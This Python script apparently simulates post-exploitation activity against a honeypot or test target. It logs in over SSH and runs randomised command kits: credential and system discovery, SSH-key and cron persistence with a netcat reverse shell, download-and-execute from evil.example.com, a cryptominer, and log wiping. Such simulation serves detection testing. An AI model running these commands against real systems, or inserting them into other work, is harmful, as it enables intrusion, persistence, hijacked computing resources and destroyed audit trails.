#!/usr/bin/env python3
"""
attacks/command_attack.py — Post-exploitation command attack simulation.

Logs in with a valid credential, then executes attacker-style command
sets: system discovery, persistence, download-and-execute, crypto-mining
commands, and history-clearing. The mix of command sets, ordering, and
count are all randomised from the seed.
"""

import argparse
import random
import sys
import time

import paramiko

from common import VALID_CREDENTIALS, validate_target

# ── Command "kits" that an attacker might run after gaining access ──

SYSTEM_DISCOVERY = [
    "uname -a",
    "id",
    "whoami",
    "cat /proc/cpuinfo",
    "cat /proc/meminfo",
    "ifconfig",
    "ip addr",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "lsb_release -a",
    "hostnamectl",
    "df -h",
    "mount",
    "netstat -tulnp",
    "ss -tulnp",
    "ps aux",
    "w",
    "last",
    "cat /etc/crontab",
]

PERSISTENCE = [
    "mkdir -p ~/.ssh",
    "echo 'ssh-rsa AAAAB3FakeKeyData== attacker@evil' >> ~/.ssh/authorized_keys",
    "chmod 600 ~/.ssh/authorized_keys",
    "echo '* * * * * /tmp/.backdoor' | crontab -",
    "crontab -l",
    "echo '#!/bin/bash\nnc -e /bin/bash 10.0.0.99 4444' > /tmp/.backdoor",
    "chmod +x /tmp/.backdoor",
    "cp /bin/sh /tmp/.hidden_shell",
    "chmod u+s /tmp/.hidden_shell",
]

DOWNLOAD_EXECUTE = [
    "wget http://evil.example.com/malware.sh -O /tmp/payload.sh",
    "curl -o /tmp/payload.sh http://evil.example.com/malware.sh",
    "chmod +x /tmp/payload.sh",
    "/tmp/payload.sh",
    "wget http://evil.example.com/rootkit.tar.gz -O /tmp/rootkit.tar.gz",
    "tar xzf /tmp/rootkit.tar.gz -C /tmp/",
    "cd /tmp && ./install.sh",
    "curl http://evil.example.com/bot.py | python3 -",
    "wget -q http://evil.example.com/ld.so.preload -O /etc/ld.so.preload",
]

CRYPTOMINER = [
    "wget http://evil.example.com/xmrig -O /tmp/xmrig",
    "chmod +x /tmp/xmrig",
    "/tmp/xmrig --donate-level 1 -o pool.evil.com:3333 -u wallet123 -p x",
    "nohup /tmp/xmrig -B --threads $(nproc) &",
    "echo '*/5 * * * * /tmp/xmrig' >> /var/spool/cron/root",
    "kill -9 $(pgrep -f competing_miner) 2>/dev/null",
]

HISTORY_CLEARING = [
    "history -c",
    "unset HISTFILE",
    "rm -f ~/.bash_history",
    "echo '' > /var/log/auth.log",
    "echo '' > /var/log/syslog",
    "rm -rf /tmp/payload* /tmp/rootkit*",
    "rm -f /var/log/wtmp",
]

# Map of kit-name → command list
COMMAND_KITS = {
    "system_discovery": SYSTEM_DISCOVERY,
    "persistence":      PERSISTENCE,
    "download_execute":  DOWNLOAD_EXECUTE,
    "cryptominer":       CRYPTOMINER,
    "history_clearing":  HISTORY_CLEARING,
}


def run(target: str, port: int, seed: int,
        min_kits: int, max_kits: int,
        min_cmds_per_kit: int, max_cmds_per_kit: int) -> dict:
    """Log in and execute a randomised mix of attacker command kits."""
    rng = random.Random(seed)

    # Pick credential
    username, password = rng.choice(VALID_CREDENTIALS)

    # Select which kits to use and in what order
    num_kits = rng.randint(min_kits, max_kits)
    kit_names = list(COMMAND_KITS.keys())
    selected = rng.choices(kit_names, k=num_kits)
    rng.shuffle(selected)

    # Always end with history_clearing if it wasn't selected
    if "history_clearing" not in selected and rng.random() < 0.7:
        selected.append("history_clearing")

    print(f"  [login] {username}@{target}:{port}")
    print(f"  [kits]  {selected}")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=target, port=port,
            username=username, password=password,
            timeout=10, look_for_keys=False, allow_agent=False,
        )
    except Exception as exc:
        print(f"  [!] Login failed: {exc}", file=sys.stderr)
        return {"kits": selected, "commands_run": 0, "login_failed": True}

    total_cmds = 0
    for kit_name in selected:
        kit_cmds = COMMAND_KITS[kit_name]
        num_cmds = rng.randint(
            min_cmds_per_kit,
            min(max_cmds_per_kit, len(kit_cmds)),
        )
        cmds = rng.sample(kit_cmds, min(num_cmds, len(kit_cmds)))
        print(f"  [{kit_name}] running {len(cmds)} commands")

        for cmd in cmds:
            pre_delay = rng.uniform(0.2, 1.5)
            time.sleep(pre_delay)
            try:
                stdin, stdout, stderr = client.exec_command(cmd)
                stdout.channel.recv_exit_status()
            except Exception:
                pass
            total_cmds += 1

        # Brief pause between kits
        time.sleep(rng.uniform(0.5, 2.0))

    client.close()
    return {"kits": selected, "commands_run": total_cmds, "login_failed": False}


def main() -> None:
    parser = argparse.ArgumentParser(description="Post-exploitation command attack simulation")
    parser.add_argument("--target", required=True)
    parser.add_argument("--port",   type=int, default=2222)
    parser.add_argument("--seed",   type=int, required=True)
    parser.add_argument("--min-kits",          type=int, default=2)
    parser.add_argument("--max-kits",          type=int, default=4)
    parser.add_argument("--min-cmds-per-kit",  type=int, default=2)
    parser.add_argument("--max-cmds-per-kit",  type=int, default=8)
    args = parser.parse_args()

    validate_target(args.target)

    print(f"[command_attack] seed={args.seed}")
    result = run(
        target=args.target, port=args.port, seed=args.seed,
        min_kits=args.min_kits, max_kits=args.max_kits,
        min_cmds_per_kit=args.min_cmds_per_kit,
        max_cmds_per_kit=args.max_cmds_per_kit,
    )
    print(f"[command_attack] Done. {result}")


if __name__ == "__main__":
    main()
